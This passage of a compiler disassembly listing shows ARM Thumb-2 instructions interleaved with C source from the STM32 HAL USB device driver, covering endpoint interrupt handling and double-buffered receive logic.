 8002cb4:	2b00      	cmp	r3, #0
 8002cb6:	f000 8121 	beq.w	8002efc <PCD_EP_ISR_Handler+0x76e>
      {
        ep = &hpcd->IN_ep[epindex];
 8002cba:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 8002cbe:	1c5a      	adds	r2, r3, #1
 8002cc0:	4613      	mov	r3, r2
 8002cc2:	009b      	lsls	r3, r3, #2
 8002cc4:	4413      	add	r3, r2
 8002cc6:	00db      	lsls	r3, r3, #3
 8002cc8:	687a      	ldr	r2, [r7, #4]
 8002cca:	4413      	add	r3, r2
 8002ccc:	657b      	str	r3, [r7, #84]	; 0x54

        /* clear int flag */
        PCD_CLEAR_TX_EP_CTR(hpcd->Instance, epindex);
 8002cce:	687b      	ldr	r3, [r7, #4]
 8002cd0:	681b      	ldr	r3, [r3, #0]
 8002cd2:	461a      	mov	r2, r3
 8002cd4:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 8002cd8:	009b      	lsls	r3, r3, #2
 8002cda:	4413      	add	r3, r2
 8002cdc:	881b      	ldrh	r3, [r3, #0]
 8002cde:	b29b      	uxth	r3, r3
 8002ce0:	f423 43e1 	bic.w	r3, r3, #28800	; 0x7080
 8002ce4:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002ce8:	f8a7 3042 	strh.w	r3, [r7, #66]	; 0x42
 8002cec:	687b      	ldr	r3, [r7, #4]
 8002cee:	681b      	ldr	r3, [r3, #0]
 8002cf0:	461a      	mov	r2, r3
 8002cf2:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 8002cf6:	009b      	lsls	r3, r3, #2
 8002cf8:	441a      	add	r2, r3
 8002cfa:	f8b7 3042 	ldrh.w	r3, [r7, #66]	; 0x42
 8002cfe:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8002d02:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002d06:	b29b      	uxth	r3, r3
 8002d08:	8013      	strh	r3, [r2, #0]

        if (ep->type == EP_TYPE_ISOC)
 8002d0a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002d0c:	78db      	ldrb	r3, [r3, #3]
 8002d0e:	2b01      	cmp	r3, #1
 8002d10:	f040 80a2 	bne.w	8002e58 <PCD_EP_ISR_Handler+0x6ca>
        {
          ep->xfer_len = 0U;
 8002d14:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002d16:	2200      	movs	r2, #0
 8002d18:	619a      	str	r2, [r3, #24]

#if (USE_USB_DOUBLE_BUFFER == 1U)
          if (ep->doublebuffer != 0U)
 8002d1a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002d1c:	7b1b      	ldrb	r3, [r3, #12]
 8002d1e:	2b00      	cmp	r3, #0
 8002d20:	f000 8093 	beq.w	8002e4a <PCD_EP_ISR_Handler+0x6bc>
          {
            if ((wEPVal & USB_EP_DTOG_TX) != 0U)
 8002d24:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002d28:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8002d2c:	2b00      	cmp	r3, #0
 8002d2e:	d046      	beq.n	8002dbe <PCD_EP_ISR_Handler+0x630>
            {
              PCD_SET_EP_DBUF0_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 8002d30:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002d32:	785b      	ldrb	r3, [r3, #1]
 8002d34:	2b00      	cmp	r3, #0
 8002d36:	d126      	bne.n	8002d86 <PCD_EP_ISR_Handler+0x5f8>
 8002d38:	687b      	ldr	r3, [r7, #4]
 8002d3a:	681b      	ldr	r3, [r3, #0]
 8002d3c:	627b      	str	r3, [r7, #36]	; 0x24
 8002d3e:	687b      	ldr	r3, [r7, #4]
 8002d40:	681b      	ldr	r3, [r3, #0]
 8002d42:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002d46:	b29b      	uxth	r3, r3
 8002d48:	461a      	mov	r2, r3
 8002d4a:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8002d4c:	4413      	add	r3, r2
 8002d4e:	627b      	str	r3, [r7, #36]	; 0x24
 8002d50:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002d52:	781b      	ldrb	r3, [r3, #0]
 8002d54:	00da      	lsls	r2, r3, #3
 8002d56:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8002d58:	4413      	add	r3, r2
 8002d5a:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002d5e:	623b      	str	r3, [r7, #32]
 8002d60:	6a3b      	ldr	r3, [r7, #32]
 8002d62:	881b      	ldrh	r3, [r3, #0]
 8002d64:	b29b      	uxth	r3, r3
 8002d66:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002d6a:	b29a      	uxth	r2, r3
 8002d6c:	6a3b      	ldr	r3, [r7, #32]
 8002d6e:	801a      	strh	r2, [r3, #0]
 8002d70:	6a3b      	ldr	r3, [r7, #32]
 8002d72:	881b      	ldrh	r3, [r3, #0]
 8002d74:	b29b      	uxth	r3, r3
 8002d76:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8002d7a:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002d7e:	b29a      	uxth	r2, r3
 8002d80:	6a3b      	ldr	r3, [r7, #32]
 8002d82:	801a      	strh	r2, [r3, #0]
 8002d84:	e061      	b.n	8002e4a <PCD_EP_ISR_Handler+0x6bc>
 8002d86:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002d88:	785b      	ldrb	r3, [r3, #1]
 8002d8a:	2b01      	cmp	r3, #1
 8002d8c:	d15d      	bne.n	8002e4a <PCD_EP_ISR_Handler+0x6bc>
 8002d8e:	687b      	ldr	r3, [r7, #4]
 8002d90:	681b      	ldr	r3, [r3, #0]
 8002d92:	62fb      	str	r3, [r7, #44]	; 0x2c
 8002d94:	687b      	ldr	r3, [r7, #4]
 8002d96:	681b      	ldr	r3, [r3, #0]
 8002d98:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002d9c:	b29b      	uxth	r3, r3
 8002d9e:	461a      	mov	r2, r3
 8002da0:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 8002da2:	4413      	add	r3, r2
 8002da4:	62fb      	str	r3, [r7, #44]	; 0x2c
 8002da6:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002da8:	781b      	ldrb	r3, [r3, #0]
 8002daa:	00da      	lsls	r2, r3, #3
 8002dac:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 8002dae:	4413      	add	r3, r2
 8002db0:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002db4:	62bb      	str	r3, [r7, #40]	; 0x28
 8002db6:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8002db8:	2200      	movs	r2, #0
 8002dba:	801a      	strh	r2, [r3, #0]
 8002dbc:	e045      	b.n	8002e4a <PCD_EP_ISR_Handler+0x6bc>
            }
            else
            {
              PCD_SET_EP_DBUF1_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 8002dbe:	687b      	ldr	r3, [r7, #4]
 8002dc0:	681b      	ldr	r3, [r3, #0]
 8002dc2:	63fb      	str	r3, [r7, #60]	; 0x3c
 8002dc4:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002dc6:	785b      	ldrb	r3, [r3, #1]
 8002dc8:	2b00      	cmp	r3, #0
 8002dca:	d126      	bne.n	8002e1a <PCD_EP_ISR_Handler+0x68c>
 8002dcc:	687b      	ldr	r3, [r7, #4]
 8002dce:	681b      	ldr	r3, [r3, #0]
 8002dd0:	637b      	str	r3, [r7, #52]	; 0x34
 8002dd2:	687b      	ldr	r3, [r7, #4]
 8002dd4:	681b      	ldr	r3, [r3, #0]
 8002dd6:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002dda:	b29b      	uxth	r3, r3
 8002ddc:	461a      	mov	r2, r3
 8002dde:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8002de0:	4413      	add	r3, r2
 8002de2:	637b      	str	r3, [r7, #52]	; 0x34
 8002de4:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002de6:	781b      	ldrb	r3, [r3, #0]
 8002de8:	00da      	lsls	r2, r3, #3
 8002dea:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8002dec:	4413      	add	r3, r2
 8002dee:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002df2:	633b      	str	r3, [r7, #48]	; 0x30
 8002df4:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8002df6:	881b      	ldrh	r3, [r3, #0]
 8002df8:	b29b      	uxth	r3, r3
 8002dfa:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002dfe:	b29a      	uxth	r2, r3
 8002e00:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8002e02:	801a      	strh	r2, [r3, #0]
 8002e04:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8002e06:	881b      	ldrh	r3, [r3, #0]
 8002e08:	b29b      	uxth	r3, r3
 8002e0a:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8002e0e:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002e12:	b29a      	uxth	r2, r3
 8002e14:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8002e16:	801a      	strh	r2, [r3, #0]
 8002e18:	e017      	b.n	8002e4a <PCD_EP_ISR_Handler+0x6bc>
 8002e1a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002e1c:	785b      	ldrb	r3, [r3, #1]
 8002e1e:	2b01      	cmp	r3, #1
 8002e20:	d113      	bne.n	8002e4a <PCD_EP_ISR_Handler+0x6bc>
 8002e22:	687b      	ldr	r3, [r7, #4]
 8002e24:	681b      	ldr	r3, [r3, #0]
 8002e26:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002e2a:	b29b      	uxth	r3, r3
 8002e2c:	461a      	mov	r2, r3
 8002e2e:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8002e30:	4413      	add	r3, r2
 8002e32:	63fb      	str	r3, [r7, #60]	; 0x3c
 8002e34:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002e36:	781b      	ldrb	r3, [r3, #0]
 8002e38:	00da      	lsls	r2, r3, #3
 8002e3a:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8002e3c:	4413      	add	r3, r2
 8002e3e:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002e42:	63bb      	str	r3, [r7, #56]	; 0x38
 8002e44:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8002e46:	2200      	movs	r2, #0
 8002e48:	801a      	strh	r2, [r3, #0]

          /* TX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
          hpcd->DataInStageCallback(hpcd, ep->num);
#else
          HAL_PCD_DataInStageCallback(hpcd, ep->num);
 8002e4a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002e4c:	781b      	ldrb	r3, [r3, #0]
 8002e4e:	4619      	mov	r1, r3
 8002e50:	6878      	ldr	r0, [r7, #4]
 8002e52:	f009 fe7c 	bl	800cb4e <HAL_PCD_DataInStageCallback>
 8002e56:	e051      	b.n	8002efc <PCD_EP_ISR_Handler+0x76e>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
        }
        else
        {
          /* Manage Single Buffer Transaction */
          if ((wEPVal & USB_EP_KIND) == 0U)
 8002e58:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002e5c:	f403 7380 	and.w	r3, r3, #256	; 0x100
 8002e60:	2b00      	cmp	r3, #0
 8002e62:	d144      	bne.n	8002eee <PCD_EP_ISR_Handler+0x760>
          {
            /* multi-packet on the NON control IN endpoint */
            TxPctSize = (uint16_t)PCD_GET_EP_TX_CNT(hpcd->Instance, ep->num);
 8002e64:	687b      	ldr	r3, [r7, #4]
 8002e66:	681b      	ldr	r3, [r3, #0]
 8002e68:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002e6c:	b29b      	uxth	r3, r3
 8002e6e:	461a      	mov	r2, r3
 8002e70:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002e72:	781b      	ldrb	r3, [r3, #0]
 8002e74:	00db      	lsls	r3, r3, #3
 8002e76:	4413      	add	r3, r2
 8002e78:	687a      	ldr	r2, [r7, #4]
 8002e7a:	6812      	ldr	r2, [r2, #0]
 8002e7c:	4413      	add	r3, r2
 8002e7e:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002e82:	881b      	ldrh	r3, [r3, #0]
 8002e84:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002e88:	f8a7 3040 	strh.w	r3, [r7, #64]	; 0x40

            if (ep->xfer_len > TxPctSize)
 8002e8c:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002e8e:	699a      	ldr	r2, [r3, #24]
 8002e90:	f8b7 3040 	ldrh.w	r3, [r7, #64]	; 0x40
 8002e94:	429a      	cmp	r2, r3
 8002e96:	d907      	bls.n	8002ea8 <PCD_EP_ISR_Handler+0x71a>
            {
              ep->xfer_len -= TxPctSize;
 8002e98:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002e9a:	699a      	ldr	r2, [r3, #24]
 8002e9c:	f8b7 3040 	ldrh.w	r3, [r7, #64]	; 0x40
 8002ea0:	1ad2      	subs	r2, r2, r3
 8002ea2:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002ea4:	619a      	str	r2, [r3, #24]
 8002ea6:	e002      	b.n	8002eae <PCD_EP_ISR_Handler+0x720>
            }
            else
            {
              ep->xfer_len = 0U;
 8002ea8:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002eaa:	2200      	movs	r2, #0
 8002eac:	619a      	str	r2, [r3, #24]
            }

            /* Zero Length Packet? */
            if (ep->xfer_len == 0U)
 8002eae:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002eb0:	699b      	ldr	r3, [r3, #24]
 8002eb2:	2b00      	cmp	r3, #0
 8002eb4:	d106      	bne.n	8002ec4 <PCD_EP_ISR_Handler+0x736>
            {
              /* TX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
              hpcd->DataInStageCallback(hpcd, ep->num);
#else
              HAL_PCD_DataInStageCallback(hpcd, ep->num);
 8002eb6:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002eb8:	781b      	ldrb	r3, [r3, #0]
 8002eba:	4619      	mov	r1, r3
 8002ebc:	6878      	ldr	r0, [r7, #4]
 8002ebe:	f009 fe46 	bl	800cb4e <HAL_PCD_DataInStageCallback>
 8002ec2:	e01b      	b.n	8002efc <PCD_EP_ISR_Handler+0x76e>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
            }
            else
            {
              /* Transfer is not yet Done */
              ep->xfer_buff += TxPctSize;
 8002ec4:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002ec6:	695a      	ldr	r2, [r3, #20]
 8002ec8:	f8b7 3040 	ldrh.w	r3, [r7, #64]	; 0x40
 8002ecc:	441a      	add	r2, r3
 8002ece:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002ed0:	615a      	str	r2, [r3, #20]
              ep->xfer_count += TxPctSize;
 8002ed2:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002ed4:	69da      	ldr	r2, [r3, #28]
 8002ed6:	f8b7 3040 	ldrh.w	r3, [r7, #64]	; 0x40
 8002eda:	441a      	add	r2, r3
 8002edc:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002ede:	61da      	str	r2, [r3, #28]
              (void)USB_EPStartXfer(hpcd->Instance, ep);
 8002ee0:	687b      	ldr	r3, [r7, #4]
 8002ee2:	681b      	ldr	r3, [r3, #0]
 8002ee4:	6d79      	ldr	r1, [r7, #84]	; 0x54
 8002ee6:	4618      	mov	r0, r3
 8002ee8:	f003 fec3 	bl	8006c72 <USB_EPStartXfer>
 8002eec:	e006      	b.n	8002efc <PCD_EP_ISR_Handler+0x76e>
          }
#if (USE_USB_DOUBLE_BUFFER == 1U)
          /* Double Buffer bulk IN (bulk transfer Len > Ep_Mps) */
          else
          {
            (void)HAL_PCD_EP_DB_Transmit(hpcd, ep, wEPVal);
 8002eee:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002ef2:	461a      	mov	r2, r3
 8002ef4:	6d79      	ldr	r1, [r7, #84]	; 0x54
 8002ef6:	6878      	ldr	r0, [r7, #4]
 8002ef8:	f000 f917 	bl	800312a <HAL_PCD_EP_DB_Transmit>
  while ((hpcd->Instance->ISTR & USB_ISTR_CTR) != 0U)
 8002efc:	687b      	ldr	r3, [r7, #4]
 8002efe:	681b      	ldr	r3, [r3, #0]
 8002f00:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8002f04:	b29b      	uxth	r3, r3
 8002f06:	b21b      	sxth	r3, r3
 8002f08:	2b00      	cmp	r3, #0
 8002f0a:	f6ff ac45 	blt.w	8002798 <PCD_EP_ISR_Handler+0xa>
        }
      }
    }
  }

  return HAL_OK;
 8002f0e:	2300      	movs	r3, #0
}
 8002f10:	4618      	mov	r0, r3
 8002f12:	3758      	adds	r7, #88	; 0x58
 8002f14:	46bd      	mov	sp, r7
 8002f16:	bd80      	pop	{r7, pc}

08002f18 <HAL_PCD_EP_DB_Receive>:
  * @param  wEPVal Last snapshot of EPRx register value taken in ISR
  * @retval HAL status
  */
static uint16_t HAL_PCD_EP_DB_Receive(PCD_HandleTypeDef *hpcd,
                                      PCD_EPTypeDef *ep, uint16_t wEPVal)
{
 8002f18:	b580      	push	{r7, lr}
 8002f1a:	b088      	sub	sp, #32
 8002f1c:	af00      	add	r7, sp, #0
 8002f1e:	60f8      	str	r0, [r7, #12]
 8002f20:	60b9      	str	r1, [r7, #8]
 8002f22:	4613      	mov	r3, r2
 8002f24:	80fb      	strh	r3, [r7, #6]
  uint16_t count;

  /* Manage Buffer0 OUT */
  if ((wEPVal & USB_EP_DTOG_RX) != 0U)
 8002f26:	88fb      	ldrh	r3, [r7, #6]
 8002f28:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8002f2c:	2b00      	cmp	r3, #0
 8002f2e:	d07c      	beq.n	800302a <HAL_PCD_EP_DB_Receive+0x112>
  {
    /* Get count of received Data on buffer0 */
    count = (uint16_t)PCD_GET_EP_DBUF0_CNT(hpcd->Instance, ep->num);
 8002f30:	68fb      	ldr	r3, [r7, #12]
 8002f32:	681b      	ldr	r3, [r3, #0]
 8002f34:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002f38:	b29b      	uxth	r3, r3
 8002f3a:	461a      	mov	r2, r3
 8002f3c:	68bb      	ldr	r3, [r7, #8]
 8002f3e:	781b      	ldrb	r3, [r3, #0]
 8002f40:	00db      	lsls	r3, r3, #3
 8002f42:	4413      	add	r3, r2
 8002f44:	68fa      	ldr	r2, [r7, #12]
 8002f46:	6812      	ldr	r2, [r2, #0]
 8002f48:	4413      	add	r3, r2
 8002f4a:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002f4e:	881b      	ldrh	r3, [r3, #0]
 8002f50:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002f54:	837b      	strh	r3, [r7, #26]

    if (ep->xfer_len >= count)
 8002f56:	68bb      	ldr	r3, [r7, #8]
 8002f58:	699a      	ldr	r2, [r3, #24]
 8002f5a:	8b7b      	ldrh	r3, [r7, #26]
 8002f5c:	429a      	cmp	r2, r3
 8002f5e:	d306      	bcc.n	8002f6e <HAL_PCD_EP_DB_Receive+0x56>
    {
      ep->xfer_len -= count;
 8002f60:	68bb      	ldr	r3, [r7, #8]
 8002f62:	699a      	ldr	r2, [r3, #24]
 8002f64:	8b7b      	ldrh	r3, [r7, #26]
 8002f66:	1ad2      	subs	r2, r2, r3
 8002f68:	68bb      	ldr	r3, [r7, #8]
 8002f6a:	619a      	str	r2, [r3, #24]
 8002f6c:	e002      	b.n	8002f74 <HAL_PCD_EP_DB_Receive+0x5c>
    }
    else
    {
      ep->xfer_len = 0U;
 8002f6e:	68bb      	ldr	r3, [r7, #8]
 8002f70:	2200      	movs	r2, #0
 8002f72:	619a      	str	r2, [r3, #24]
    }

    if (ep->xfer_len == 0U)
 8002f74:	68bb      	ldr	r3, [r7, #8]
 8002f76:	699b      	ldr	r3, [r3, #24]
 8002f78:	2b00      	cmp	r3, #0
 8002f7a:	d123      	bne.n	8002fc4 <HAL_PCD_EP_DB_Receive+0xac>
    {
      /* set NAK to OUT endpoint since double buffer is enabled */
      PCD_SET_EP_RX_STATUS(hpcd->Instance, ep->num, USB_EP_RX_NAK);
 8002f7c:	68fb      	ldr	r3, [r7, #12]
 8002f7e:	681b      	ldr	r3, [r3, #0]
 8002f80:	461a      	mov	r2, r3
 8002f82:	68bb      	ldr	r3, [r7, #8]
 8002f84:	781b      	ldrb	r3, [r3, #0]
 8002f86:	009b      	lsls	r3, r3, #2
 8002f88:	4413      	add	r3, r2
 8002f8a:	881b      	ldrh	r3, [r3, #0]
 8002f8c:	b29b      	uxth	r3, r3
 8002f8e:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8002f92:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002f96:	833b      	strh	r3, [r7, #24]
 8002f98:	8b3b      	ldrh	r3, [r7, #24]
 8002f9a:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 8002f9e:	833b      	strh	r3, [r7, #24]
 8002fa0:	68fb      	ldr	r3, [r7, #12]
 8002fa2:	681b      	ldr	r3, [r3, #0]
 8002fa4:	461a      	mov	r2, r3
 8002fa6:	68bb      	ldr	r3, [r7, #8]
 8002fa8:	781b      	ldrb	r3, [r3, #0]
 8002faa:	009b      	lsls	r3, r3, #2
 8002fac:	441a      	add	r2, r3
 8002fae:	8b3b      	ldrh	r3, [r7, #24]
 8002fb0:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8002fb4:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8002fb8:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8002fbc:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8002fc0:	b29b      	uxth	r3, r3
 8002fc2:	8013      	strh	r3, [r2, #0]
    }

    /* Check if Buffer1 is in blocked state which requires to toggle */
    if ((wEPVal & USB_EP_DTOG_TX) != 0U)
 8002fc4:	88fb      	ldrh	r3, [r7, #6]
 8002fc6:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8002fca:	2b00      	cmp	r3, #0
 8002fcc:	d01f      	beq.n	800300e <HAL_PCD_EP_DB_Receive+0xf6>
    {
      PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 0U);
 8002fce:	68fb      	ldr	r3, [r7, #12]
 8002fd0:	681b      	ldr	r3, [r3, #0]
 8002fd2:	461a      	mov	r2, r3
 8002fd4:	68bb      	ldr	r3, [r7, #8]
 8002fd6:	781b      	ldrb	r3, [r3, #0]
 8002fd8:	009b      	lsls	r3, r3, #2
 8002fda:	4413      	add	r3, r2
 8002fdc:	881b      	ldrh	r3, [r3, #0]
 8002fde:	b29b      	uxth	r3, r3
 8002fe0:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8002fe4:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002fe8:	82fb      	strh	r3, [r7, #22]
 8002fea:	68fb      	ldr	r3, [r7, #12]
 8002fec:	681b      	ldr	r3, [r3, #0]
 8002fee:	461a      	mov	r2, r3
 8002ff0:	68bb      	ldr	r3, [r7, #8]
 8002ff2:	781b      	ldrb	r3, [r3, #0]
 8002ff4:	009b      	lsls	r3, r3, #2
 8002ff6:	441a      	add	r2, r3
 8002ff8:	8afb      	ldrh	r3, [r7, #22]
 8002ffa:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8002ffe:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8003002:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8003006:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 800300a:	b29b      	uxth	r3, r3
 800300c:	8013      	strh	r3, [r2, #0]
    }

    if (count != 0U)
 800300e:	8b7b      	ldrh	r3, [r7, #26]
 8003010:	2b00      	cmp	r3, #0
 8003012:	f000 8085 	beq.w	8003120 <HAL_PCD_EP_DB_Receive+0x208>
    {
      USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaaddr0, count);
 8003016:	68fb      	ldr	r3, [r7, #12]
 8003018:	6818      	ldr	r0, [r3, #0]
 800301a:	68bb      	ldr	r3, [r7, #8]
 800301c:	6959      	ldr	r1, [r3, #20]
 800301e:	68bb      	ldr	r3, [r7, #8]
 8003020:	891a      	ldrh	r2, [r3, #8]
 8003022:	8b7b      	ldrh	r3, [r7, #26]
 8003024:	f005 fb73 	bl	800870e <USB_ReadPMA>
 8003028:	e07a      	b.n	8003120 <HAL_PCD_EP_DB_Receive+0x208>
  }
  /* Manage Buffer 1 DTOG_RX=0 */
  else
  {
    /* Get count of received data */
    count = (uint16_t)PCD_GET_EP_DBUF1_CNT(hpcd->Instance, ep->num);
 800302a:	68fb      	ldr	r3, [r7, #12]
 800302c:	681b      	ldr	r3, [r3, #0]
 800302e:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8003032:	b29b      	uxth	r3, r3
 8003034:	461a      	mov	r2, r3
 8003036:	68bb      	ldr	r3, [r7, #8]
 8003038:	781b      	ldrb	r3, [r3, #0]
 800303a:	00db      	lsls	r3, r3, #3
 800303c:	4413      	add	r3, r2
 800303e:	68fa      	ldr	r2, [r7, #12]
 8003040:	6812      	ldr	r2, [r2, #0]
 8003042:	4413      	add	r3, r2
 8003044:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8003048:	881b      	ldrh	r3, [r3, #0]
 800304a:	f3c3 0309 	ubfx	r3, r3, #0, #10
 800304e:	837b      	strh	r3, [r7, #26]

    if (ep->xfer_len >= count)
 8003050:	68bb      	ldr	r3, [r7, #8]
 8003052:	699a      	ldr	r2, [r3, #24]
 8003054:	8b7b      	ldrh	r3, [r7, #26]
 8003056:	429a      	cmp	r2, r3
 8003058:	d306      	bcc.n	8003068 <HAL_PCD_EP_DB_Receive+0x150>
    {
      ep->xfer_len -= count;
 800305a:	68bb      	ldr	r3, [r7, #8]
 800305c:	699a      	ldr	r2, [r3, #24]
 800305e:	8b7b      	ldrh	r3, [r7, #26]
 8003060:	1ad2      	subs	r2, r2, r3
 8003062:	68bb      	ldr	r3, [r7, #8]
 8003064:	619a      	str	r2, [r3, #24]
 8003066:	e002      	b.n	800306e <HAL_PCD_EP_DB_Receive+0x156>
    }
    else
    {
      ep->xfer_len = 0U;
 8003068:	68bb      	ldr	r3, [r7, #8]
 800306a:	2200      	movs	r2, #0
 800306c:	619a      	str	r2, [r3, #24]
    }

    if (ep->xfer_len == 0U)
 800306e:	68bb      	ldr	r3, [r7, #8]
 8003070:	699b      	ldr	r3, [r3, #24]
 8003072:	2b00      	cmp	r3, #0
 8003074:	d123      	bne.n	80030be <HAL_PCD_EP_DB_Receive+0x1a6>
    {
      /* set NAK on the current endpoint */
      PCD_SET_EP_RX_STATUS(hpcd->Instance, ep->num, USB_EP_RX_NAK);
 8003076:	68fb      	ldr	r3, [r7, #12]
 8003078:	681b      	ldr	r3, [r3, #0]
 800307a:	461a      	mov	r2, r3
 800307c:	68bb      	ldr	r3, [r7, #8]
 800307e:	781b      	ldrb	r3, [r3, #0]
 8003080:	009b      	lsls	r3, r3, #2
 8003082:	4413      	add	r3, r2
 8003084:	881b      	ldrh	r3, [r3, #0]
 8003086:	b29b      	uxth	r3, r3
 8003088:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 800308c:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8003090:	83fb      	strh	r3, [r7, #30]
 8003092:	8bfb      	ldrh	r3, [r7, #30]
 8003094:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 8003098:	83fb      	strh	r3, [r7, #30]
 800309a:	68fb      	ldr	r3, [r7, #12]
 800309c:	681b      	ldr	r3, [r3, #0]
 800309e:	461a      	mov	r2, r3
 80030a0:	68bb      	ldr	r3, [r7, #8]
 80030a2:	781b      	ldrb	r3, [r3, #0]
 80030a4:	009b      	lsls	r3, r3, #2
 80030a6:	441a      	add	r2, r3
 80030a8:	8bfb      	ldrh	r3, [r7, #30]
 80030aa:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80030ae:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80030b2:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80030b6:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80030ba:	b29b      	uxth	r3, r3
 80030bc:	8013      	strh	r3, [r2, #0]
    }

    /*Need to FreeUser Buffer*/
    if ((wEPVal & USB_EP_DTOG_TX) == 0U)
 80030be:	88fb      	ldrh	r3, [r7, #6]
 80030c0:	f003 0340 	and.w	r3, r3, #64	; 0x40
 80030c4:	2b00      	cmp	r3, #0
 80030c6:	d11f      	bne.n	8003108 <HAL_PCD_EP_DB_Receive+0x1f0>
    {
      PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 0U);
 80030c8:	68fb      	ldr	r3, [r7, #12]
 80030ca:	681b      	ldr	r3, [r3, #0]
 80030cc:	461a      	mov	r2, r3
 80030ce:	68bb      	ldr	r3, [r7, #8]
 80030d0:	781b      	ldrb	r3, [r3, #0]
 80030d2:	009b      	lsls	r3, r3, #2
 80030d4:	4413      	add	r3, r2
 80030d6:	881b      	ldrh	r3, [r3, #0]
